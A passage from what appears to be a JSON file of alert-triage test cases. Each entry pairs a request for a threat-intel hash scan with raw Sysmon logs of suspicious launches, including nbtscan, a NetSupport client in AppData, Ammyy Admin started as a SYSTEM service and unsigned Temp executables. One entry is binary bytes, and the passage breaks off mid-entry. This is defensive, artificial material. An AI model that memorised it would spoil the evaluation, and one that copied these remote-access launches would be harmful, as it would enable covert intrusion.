            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\stevemorris\\\\Desktop\\\\program.exe\\\"\",\"Company\":\"Softdiv Software Sdn Bhd\",\"Computer\":\"DESKTOP-SM\",\"CurrentDirectory\":\"C:\\\\Users\\\\stevemorris\\\\Desktop\\\\\",\"Description\":\"Softdiv MP3 to WAV Converter.exe\",\"EventID\":1,\"FileVersion\":\"0.3.2.0\",\"Hashes\":\"MD5=4265F75CBB4BA1BC23B07890ED42872B,SHA256=5A29583A80B7DC2CBCE4B8712024DCDFF9F777D908B6F16DFB3D59FAD991083E,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744\",\"Hostname\":\"stevemorris-pc\",\"Image\":\"C:\\\\Users\\\\stevemorris\\\\Desktop\\\\program.exe\",\"IntegrityLevel\":\"High\",\"Level\":4,\"LogonGuid\":\"{C784477D-AA65-6384-87E8-030000000000}\",\"LogonId\":\"0x3e887\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"fbab6880a695.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-AA65-6384-6B00-000000004300}\",\"ParentProcessId\":\"4920\",\"ProcessGuid\":\"{C784477D-3B4B-638F-0206-000000004300}\",\"ProcessID\":2288,\"ProcessId\":\"6288\",\"Product\":\"Softdiv MP3 to WAV Converter 3.2\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":92332,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":688,\"User\":\"DESKTOP-SM\\\\stevemorris\",\"UserID\":\"S-1-5-12-783622181-14434791-6080415151-691320\",\"UtcTime\":\"2024-11-20 05:32:31.000000\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "374": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activitynbtscan.exe launched by cmd.exe",
        "ini_data": [
            "<14>Sep 20 04:11:36 win-server.lunarstiiiness.com Microsoft-Windows-Sysmon[1288]: {\"EventTime\":1726719095,\"Hostname\":\"win-server.lunarstiiiness.com\",\"Keywords\":-9223372036854775808,\"EventType\":\"INFO\",\"SeverityValue\":2,\"Severity\":\"INFO\",\"EventID\":1,\"SourceName\":\"Microsoft-Windows-Sysmon\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"Version\":5,\"Task\":1,\"OpcodeValue\":0,\"RecordNumber\":943296,\"ProcessID\":1288,\"ThreadID\":2884,\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"Domain\":\"NT AUTHORITY\",\"AccountName\":\"SYSTEM\",\"UserID\":\"S-1-5-18\",\"AccountType\":\"User\",\"Message\":\"Process Create:\\r\\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\\r\\nUtcTime: 2024-09-19 04:11:35.033\\r\\nProcessGuid: {BE59402F-31C2-6402-8D01-000000001900}\\r\\nProcessId: 5712\\r\\nImage: D:\\\\Software\\\\nbtscan.exe\\r\\nFileVersion: -\\r\\nDescription: -\\r\\nProduct: -\\r\\nCompany: -\\r\\nOriginalFileName: -\\r\\nCommandLine: nbtscan\\r\\nCurrentDirectory: D:\\\\Software\\\\\\r\\nUser: LUNARSTIIINESS\\\\tim.smith_admin\\r\\nLogonGuid: {BE59402F-2E2D-6402-19D0-DA0000000000}\\r\\nLogonId: 0xDAD019\\r\\nTerminalSessionId: 3\\r\\nIntegrityLevel: High\\r\\nHashes: SHA1=90DA10004C8F6FAFDAA2CF18922670A745564F45,MD5=F01A9A2D1E31332ED36C1A4D2839F412,SHA256=C9D5DC956841E000BFD8762E2F0B48B66C79B79500E894B4EFA7FB9BA17E4E9E,IMPHASH=2FA43C5392EC7923ABABCED078C2F98D\\r\\nParentProcessGuid: {BE59402F-31B3-6402-8901-000000001900}\\r\\nParentProcessId: 6016\\r\\nParentImage: C:\\\\Windows\\\\System32\\\\cmd.exe\\r\\nParentCommandLine: \\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" \\r\\nParentUser: LUNARSTIIINESS\\\\tim.smith_admin\",\"Category\":\"Process Create (rule: ProcessCreate)\",\"Opcode\":\"Info\",\"RuleName\":\"technique_id=T1059,technique_name=Command-Line Interface\",\"UtcTime\":\"2024-09-19 04:11:35.033\",\"ProcessGuid\":\"{BE59402F-31C2-6402-8D01-000000001900}\",\"Image\":\"D:\\\\Software\\\\nbtscan.exe\",\"FileVersion\":\"-\",\"Description\":\"-\",\"Product\":\"-\",\"Company\":\"-\",\"OriginalFileName\":\"-\",\"CommandLine\":\"nbtscan\",\"CurrentDirectory\":\"D:\\\\Software\\\\\",\"User\":\"LUNARSTIIINESS\\\\tim.smith_admin\",\"LogonGuid\":\"{BE59402F-2E2D-6402-19D0-DA0000000000}\",\"LogonId\":\"0xdad019\",\"TerminalSessionId\":\"3\",\"IntegrityLevel\":\"High\",\"Hashes\":\"SHA1=90DA10004C8F6FAFDAA2CF18922670A745564F45,MD5=F01A9A2D1E31332ED36C1A4D2839F412,SHA256=C9D5DC956841E000BFD8762E2F0B48B66C79B79500E894B4EFA7FB9BA17E4E9E,IMPHASH=2FA43C5392EC7923ABABCED078C2F98D\",\"ParentProcessGuid\":\"{BE59402F-31B3-6402-8901-000000001900}\",\"ParentProcessId\":\"6016\",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"ParentCommandLine\":\"\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" \",\"ParentUser\":\"LUNARSTIIINESS\\\\tim.smith_admin\",\"EventReceivedTime\":1726719096,\"SourceModuleName\":\"in_sysmon\",\"SourceModuleType\":\"im_msvistalog\"}\r\nudm.principal.process.file.full_path: C:\\Windows\\System32\\cmd.exe\r\nudm.principal.process.file.sha256: 935c1861df1f4018d698e8b65abfa02d7e9037d8f68ca3c2065b6ca165d44ad2"
        ]
    },
    "375": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityclient32.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\client32.exe\\\" \",\"Company\":\"NetSupport Ltd\",\"Computer\":\"wins-d19\",\"CurrentDirectory\":\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\\",\"Description\":\"NetSupport Client Application\",\"EventID\":1,\"FileVersion\":\"V12.70\",\"Hashes\":\"MD5=877F5E83FB39DE16FA8BBD93BA9F07F1,SHA256=418744FA1ADE539C280461387DF87DDA6BF84C7D755EBBBDC6123FD5659F9467,IMPHASH=A9D50692E95B79723F3E76FCF70D023E\",\"Hostname\":\"wins-d19\",\"Image\":\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\client32.exe\",\"IntegrityLevel\":\"High\",\"Level\":4,\"LogonGuid\":\"{C784477D-081A-6482-DB4F-040000000000}\",\"LogonId\":\"0x44fdb\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"client32.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-081A-6482-8000-000000004A00}\",\"ParentProcessId\":\"4668\",\"ProcessGuid\":\"{C784477D-B0FA-648B-BC0A-000000004A00}\",\"ProcessID\":2240,\"ProcessId\":\"6156\",\"Product\":\"NetSupport Manager\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":749905,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":2996,\"User\":\"wins-d19\\\\lisawalker\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-12-06 05:35:20.000\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "376": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityclient32.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\client32.exe\\\" \",\"Company\":\"NetSupport Ltd\",\"Computer\":\"wins-d19\",\"CurrentDirectory\":\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\\",\"Description\":\"NetSupport Client Application\",\"EventID\":1,\"FileVersion\":\"V12.70\",\"Hashes\":\"MD5=877F5E83FB39DE16FA8BBD93BA9F07F1,SHA256=418744FA1ADE539C280461387DF87DDA6BF84C7D755EBBBDC6123FD5659F9467,IMPHASH=A9D50692E95B79723F3E76FCF70D023E\",\"Hostname\":\"wins-d19\",\"Image\":\"C:\\\\Users\\\\lisawalker\\\\AppData\\\\Roaming\\\\OfficeStartup\\\\client32.exe\",\"IntegrityLevel\":\"High\",\"Level\":4,\"LogonGuid\":\"{C784477D-081A-6482-DB4F-040000000000}\",\"LogonId\":\"0x44fdb\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"client32.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-081A-6482-8000-000000004A00}\",\"ParentProcessId\":\"4668\",\"ProcessGuid\":\"{C784477D-B0FA-648B-BC0A-000000004A00}\",\"ProcessID\":2240,\"ProcessId\":\"6156\",\"Product\":\"NetSupport Manager\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":749905,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":2996,\"User\":\"wins-d19\\\\lisawalker\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-11-23 05:34:55.000\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "377": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityAA_v3.exe launched by services.exe",
        "ini_data": [
            "<14>Oct 08 04:46:15 serhatg.local Microsoft-Windows-Sysmon[3228]: {\"EventTime\":1728276375,\"Hostname\":\"serhatg.local\",\"Keywords\":-9223372036854775808,\"EventType\":\"INFO\",\"SeverityValue\":2,\"Severity\":\"INFO\",\"EventID\":1,\"SourceName\":\"Microsoft-Windows-Sysmon\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"Version\":5,\"Task\":1,\"OpcodeValue\":0,\"RecordNumber\":266996,\"ProcessID\":3228,\"ThreadID\":4252,\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"Domain\":\"NT AUTHORITY\",\"AccountName\":\"SYSTEM\",\"UserID\":\"S-1-5-18\",\"AccountType\":\"User\",\"Message\":\"Process Create:\\r\\nRuleName: -\\r\\nUtcTime: 2024-10-07 04:46:14.347\\r\\nProcessGuid: {f31bccf6-71b8-6491-bb0d-000000001800}\\r\\nProcessId: 8660\\r\\nImage: C:\\\\Users\\\\serhatg\\\\Downloads\\\\AA_v3.exe\\r\\nFileVersion: 3.10\\r\\nDescription: Ammyy Admin\\r\\nProduct: Ammyy Admin\\r\\nCompany: Ammyy LLC\\r\\nOriginalFileName: -\\r\\nCommandLine: \\\"C:\\\\Users\\\\serhatg\\\\Downloads\\\\AA_v3.exe\\\" -service -lunch\\r\\nCurrentDirectory: C:\\\\Windows\\\\system32\\\\\\r\\nUser: NT AUTHORITY\\\\SYSTEM\\r\\nLogonGuid: {f31bccf6-3a7a-6489-e703-000000000000}\\r\\nLogonId: 0x3E7\\r\\nTerminalSessionId: 0\\r\\nIntegrityLevel: System\\r\\nHashes: MD5=90AADF2247149996AE443E2C82AF3730,SHA256=EE573647477339784DCEF81024DE1BE1762833A20E5CC2B89A93E47D05B86B6A,IMPHASH=3E985254F2E34AD96DA799A2A5D33EFE\\r\\nParentProcessGuid: {f31bccf6-3a7a-6489-0b00-000000001800}\\r\\nParentProcessId: 612\\r\\nParentImage: C:\\\\Windows\\\\System32\\\\services.exe\\r\\nParentCommandLine: C:\\\\Windows\\\\system32\\\\services.exe\\r\\nParentUser: NT AUTHORITY\\\\SYSTEM\",\"Category\":\"Process Create (rule: ProcessCreate)\",\"Opcode\":\"Info\",\"RuleName\":\"-\",\"UtcTime\":\"2024-10-07 04:46:14.347\",\"ProcessGuid\":\"{f31bccf6-71b8-6491-bb0d-000000001800}\",\"Image\":\"C:\\\\Users\\\\serhatg\\\\Downloads\\\\AA_v3.exe\",\"FileVersion\":\"3.10\",\"Description\":\"Ammyy Admin\",\"Product\":\"Ammyy Admin\",\"Company\":\"Ammyy LLC\",\"OriginalFileName\":\"-\",\"CommandLine\":\"\\\"C:\\\\Users\\\\serhatg\\\\Downloads\\\\AA_v3.exe\\\" -service -lunch\",\"CurrentDirectory\":\"C:\\\\Windows\\\\system32\\\\\",\"User\":\"NT AUTHORITY\\\\SYSTEM\",\"LogonGuid\":\"{f31bccf6-3a7a-6489-e703-000000000000}\",\"LogonId\":\"0x3e7\",\"TerminalSessionId\":\"0\",\"IntegrityLevel\":\"System\",\"Hashes\":\"MD5=90AADF2247149996AE443E2C82AF3730,SHA256=EE573647477339784DCEF81024DE1BE1762833A20E5CC2B89A93E47D05B86B6A,IMPHASH=3E985254F2E34AD96DA799A2A5D33EFE\",\"ParentProcessGuid\":\"{f31bccf6-3a7a-6489-0b00-000000001800}\",\"ParentProcessId\":\"612\",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\services.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\system32\\\\services.exe\",\"ParentUser\":\"NT AUTHORITY\\\\SYSTEM\",\"EventReceivedTime\":1728276375,\"SourceModuleName\":\"in_sysmon\",\"SourceModuleType\":\"im_msvistalog\"}\r\nudm.principal.process.file.full_path: C:\\Windows\\System32\\services.exe"
        ]
    },
    "378": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activitynbtscan.exe launched by cmd.exe",
        "ini_data": [
            "<14>Oct 02 04:15:46 win-server.lunarstiiiness.com Microsoft-Windows-Sysmon[1288]: {\"EventTime\":1727756145,\"Hostname\":\"win-server.lunarstiiiness.com\",\"Keywords\":-9223372036854775808,\"EventType\":\"INFO\",\"SeverityValue\":2,\"Severity\":\"INFO\",\"EventID\":1,\"SourceName\":\"Microsoft-Windows-Sysmon\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"Version\":5,\"Task\":1,\"OpcodeValue\":0,\"RecordNumber\":943296,\"ProcessID\":1288,\"ThreadID\":2884,\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"Domain\":\"NT AUTHORITY\",\"AccountName\":\"SYSTEM\",\"UserID\":\"S-1-5-18\",\"AccountType\":\"User\",\"Message\":\"Process Create:\\r\\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\\r\\nUtcTime: 2024-10-01 04:15:45.033\\r\\nProcessGuid: {BE59402F-31C2-6402-8D01-000000001900}\\r\\nProcessId: 5712\\r\\nImage: D:\\\\Software\\\\nbtscan.exe\\r\\nFileVersion: -\\r\\nDescription: -\\r\\nProduct: -\\r\\nCompany: -\\r\\nOriginalFileName: -\\r\\nCommandLine: nbtscan\\r\\nCurrentDirectory: D:\\\\Software\\\\\\r\\nUser: LUNARSTIIINESS\\\\tim.smith_admin\\r\\nLogonGuid: {BE59402F-2E2D-6402-19D0-DA0000000000}\\r\\nLogonId: 0xDAD019\\r\\nTerminalSessionId: 3\\r\\nIntegrityLevel: High\\r\\nHashes: SHA1=90DA10004C8F6FAFDAA2CF18922670A745564F45,MD5=F01A9A2D1E31332ED36C1A4D2839F412,SHA256=C9D5DC956841E000BFD8762E2F0B48B66C79B79500E894B4EFA7FB9BA17E4E9E,IMPHASH=2FA43C5392EC7923ABABCED078C2F98D\\r\\nParentProcessGuid: {BE59402F-31B3-6402-8901-000000001900}\\r\\nParentProcessId: 6016\\r\\nParentImage: C:\\\\Windows\\\\System32\\\\cmd.exe\\r\\nParentCommandLine: \\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" \\r\\nParentUser: LUNARSTIIINESS\\\\tim.smith_admin\",\"Category\":\"Process Create (rule: ProcessCreate)\",\"Opcode\":\"Info\",\"RuleName\":\"technique_id=T1059,technique_name=Command-Line Interface\",\"UtcTime\":\"2024-10-01 04:15:45.033\",\"ProcessGuid\":\"{BE59402F-31C2-6402-8D01-000000001900}\",\"Image\":\"D:\\\\Software\\\\nbtscan.exe\",\"FileVersion\":\"-\",\"Description\":\"-\",\"Product\":\"-\",\"Company\":\"-\",\"OriginalFileName\":\"-\",\"CommandLine\":\"nbtscan\",\"CurrentDirectory\":\"D:\\\\Software\\\\\",\"User\":\"LUNARSTIIINESS\\\\tim.smith_admin\",\"LogonGuid\":\"{BE59402F-2E2D-6402-19D0-DA0000000000}\",\"LogonId\":\"0xdad019\",\"TerminalSessionId\":\"3\",\"IntegrityLevel\":\"High\",\"Hashes\":\"SHA1=90DA10004C8F6FAFDAA2CF18922670A745564F45,MD5=F01A9A2D1E31332ED36C1A4D2839F412,SHA256=C9D5DC956841E000BFD8762E2F0B48B66C79B79500E894B4EFA7FB9BA17E4E9E,IMPHASH=2FA43C5392EC7923ABABCED078C2F98D\",\"ParentProcessGuid\":\"{BE59402F-31B3-6402-8901-000000001900}\",\"ParentProcessId\":\"6016\",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"ParentCommandLine\":\"\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" \",\"ParentUser\":\"LUNARSTIIINESS\\\\tim.smith_admin\",\"EventReceivedTime\":1727756146,\"SourceModuleName\":\"in_sysmon\",\"SourceModuleType\":\"im_msvistalog\"}\r\nudm.principal.process.file.full_path: C:\\Windows\\System32\\cmd.exe\r\nudm.principal.process.file.sha256: 935c1861df1f4018d698e8b65abfa02d7e9037d8f68ca3c2065b6ca165d44ad2"
        ]
    },
    "379": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activity4848.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\4848.exe\",\"Company\":\"-\",\"Computer\":\"DESKTOPS\",\"CurrentDirectory\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\\",\"Description\":\" \",\"EventID\":1,\"FileVersion\":\"1.0.0.0\",\"Hashes\":\"MD5=DD879217D6270CE10527C1F4752E2602,SHA256=A406A3C1474A57C62F3DBD56AA15D5D732E6A0FE8BBFD7BCE9425B132204DA8B,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744\",\"Hostname\":\"oscar.wild.desktop\",\"Image\":\"C:\\\\Users\\\\oscar.wild\\\\AppData\\\\Local\\\\Temp\\\\4848.exe\",\"IntegrityLevel\":\"Medium\",\"Level\":4,\"LogonGuid\":\"{C784477D-83CA-6536-C5CD-030000000000}\",\"LogonId\":\"0x3cdc5\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"newrock.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-83CA-6536-6B00-000000004A00}\",\"ParentProcessId\":\"4968\",\"ProcessGuid\":\"{C784477D-969B-653B-B006-000000004A00}\",\"ProcessID\":2308,\"ProcessId\":\"10148\",\"Product\":\"-\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":1379908,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":704,\"User\":\"DESKTOPS\\\\oscar.wild\",\"UserID\":\"S-1-5-18\",\"UtcTime\":\"2024-11-20 05:32:15.136\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "380": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityprogram.exe launched by explorer.exe",
        "ini_data": [
            "{\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"CommandLine\":\"\\\"C:\\\\Users\\\\stevemorris\\\\Desktop\\\\program.exe\\\"\",\"Company\":\"Softdiv Software Sdn Bhd\",\"Computer\":\"DESKTOP-SM\",\"CurrentDirectory\":\"C:\\\\Users\\\\stevemorris\\\\Desktop\\\\\",\"Description\":\"Softdiv MP3 to WAV Converter.exe\",\"EventID\":1,\"FileVersion\":\"0.3.2.0\",\"Hashes\":\"MD5=4265F75CBB4BA1BC23B07890ED42872B,SHA256=5A29583A80B7DC2CBCE4B8712024DCDFF9F777D908B6F16DFB3D59FAD991083E,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744\",\"Hostname\":\"stevemorris-pc\",\"Image\":\"C:\\\\Users\\\\stevemorris\\\\Desktop\\\\program.exe\",\"IntegrityLevel\":\"High\",\"Level\":4,\"LogonGuid\":\"{C784477D-AA65-6384-87E8-030000000000}\",\"LogonId\":\"0x3e887\",\"Message\":\"\",\"OpcodeValue\":0,\"OriginalFileName\":\"fbab6880a695.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\Explorer.EXE\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ParentProcessGuid\":\"{C784477D-AA65-6384-6B00-000000004300}\",\"ParentProcessId\":\"4920\",\"ProcessGuid\":\"{C784477D-3B4B-638F-0206-000000004300}\",\"ProcessID\":2288,\"ProcessId\":\"6288\",\"Product\":\"Softdiv MP3 to WAV Converter 3.2\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"RecordNumber\":92332,\"RuleName\":\"-\",\"SourceName\":\"Microsoft-Windows-Sysmon\",\"TerminalSessionId\":\"1\",\"ThreadID\":688,\"User\":\"DESKTOP-SM\\\\stevemorris\",\"UserID\":\"S-1-5-12-783622181-14434791-6080415151-691320\",\"UtcTime\":\"2024-11-14 05:32:39.000000\",\"Version\":5}\r\nudm.principal.process.file.full_path: C:\\Windows\\explorer.exe"
        ]
    },
    "381": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityqClNkVtHKskoh.exe",
        "ini_data": [
            "□%□□□□□□□□□□□□□□ □N2□Chronicle Internal□$□ paul-rubel-windows-pc.corp.local\"□*f\"d□□63424□Q□ 27444605dff20d1e704b5cf682d035d2*-C:\\Users\\AppData\\Local\\Temp\\qClNkVtHKskoh.exe*□ID:63424"
        ]
    },
    "382": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityAA_v3.exe launched by services.exe",
        "ini_data": [
            "<14>Oct 02 04:52:47 serhatg.local Microsoft-Windows-Sysmon[3228]: {\"EventTime\":1727758367,\"Hostname\":\"serhatg.local\",\"Keywords\":-9223372036854775808,\"EventType\":\"INFO\",\"SeverityValue\":2,\"Severity\":\"INFO\",\"EventID\":1,\"SourceName\":\"Microsoft-Windows-Sysmon\",\"ProviderGuid\":\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\"Version\":5,\"Task\":1,\"OpcodeValue\":0,\"RecordNumber\":266996,\"ProcessID\":3228,\"ThreadID\":4252,\"Channel\":\"Microsoft-Windows-Sysmon/Operational\",\"Domain\":\"NT AUTHORITY\",\"AccountName\":\"SYSTEM\",\"UserID\":\"S-1-5-18\",\"AccountType\":\"User\",\"Message\":\"Process Create:\\r\\nRuleName: -\\r\\nUtcTime: 2024-10-01 04:52:46.347\\r\\nProcessGuid: {f31bccf6-71b8-6491-bb0d-000000001800}\\r\\nProcessId: 8660\\r\\nImage: C:\\\\Users\\\\serhatg\\\\Downloads\\\\AA_v3.exe\\r\\nFileVersion: 3.10\\r\\nDescription: Ammyy Admin\\r\\nProduct: Ammyy Admin\\r\\nCompany: Ammyy LLC\\r\\nOriginalFileName: -\\r\\nCommandLine: \\\"C:\\\\Users\\\\serhatg\\\\Downloads\\\\AA_v3.exe\\\" -service -lunch\\r\\nCurrentDirectory: C:\\\\Windows\\\\system32\\\\\\r\\nUser: NT AUTHORITY\\\\SYSTEM\\r\\nLogonGuid: {f31bccf6-3a7a-6489-e703-000000000000}\\r\\nLogonId: 0x3E7\\r\\nTerminalSessionId: 0\\r\\nIntegrityLevel: System\\r\\nHashes: MD5=90AADF2247149996AE443E2C82AF3730,SHA256=EE573647477339784DCEF81024DE1BE1762833A20E5CC2B89A93E47D05B86B6A,IMPHASH=3E985254F2E34AD96DA799A2A5D33EFE\\r\\nParentProcessGuid: {f31bccf6-3a7a-6489-0b00-000000001800}\\r\\nParentProcessId: 612\\r\\nParentImage: C:\\\\Windows\\\\System32\\\\services.exe\\r\\nParentCommandLine: C:\\\\Windows\\\\system32\\\\services.exe\\r\\nParentUser: NT AUTHORITY\\\\SYSTEM\",\"Category\":\"Process Create (rule: ProcessCreate)\",\"Opcode\":\"Info\",\"RuleName\":\"-\",\"UtcTime\":\"2024-10-01 04:52:46.347\",\"ProcessGuid\":\"{f31bccf6-71b8-6491-bb0d-000000001800}\",\"Image\":\"C:\\\\Users\\\\serhatg\\\\Downloads\\\\AA_v3.exe\",\"FileVersion\":\"3.10\",\"Description\":\"Ammyy Admin\",\"Product\":\"Ammyy Admin\",\"Company\":\"Ammyy LLC\",\"OriginalFileName\":\"-\",\"CommandLine\":\"\\\"C:\\\\Users\\\\serhatg\\\\Downloads\\\\AA_v3.exe\\\" -service -lunch\",\"CurrentDirectory\":\"C:\\\\Windows\\\\system32\\\\\",\"User\":\"NT AUTHORITY\\\\SYSTEM\",\"LogonGuid\":\"{f31bccf6-3a7a-6489-e703-000000000000}\",\"LogonId\":\"0x3e7\",\"TerminalSessionId\":\"0\",\"IntegrityLevel\":\"System\",\"Hashes\":\"MD5=90AADF2247149996AE443E2C82AF3730,SHA256=EE573647477339784DCEF81024DE1BE1762833A20E5CC2B89A93E47D05B86B6A,IMPHASH=3E985254F2E34AD96DA799A2A5D33EFE\",\"ParentProcessGuid\":\"{f31bccf6-3a7a-6489-0b00-000000001800}\",\"ParentProcessId\":\"612\",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\services.exe\",\"ParentCommandLine\":\"C:\\\\Windows\\\\system32\\\\services.exe\",\"ParentUser\":\"NT AUTHORITY\\\\SYSTEM\",\"EventReceivedTime\":1727758367,\"SourceModuleName\":\"in_sysmon\",\"SourceModuleType\":\"im_msvistalog\"}\r\nudm.principal.process.file.full_path: C:\\Windows\\System32\\services.exe"
        ]
    },
    "383": {
        "alert_brief": "Use Google Cloud Threat Intel hash intelligence to scan for malicious process launch activityclient32.exe launched by powershell.exe",
        "ini_data": [
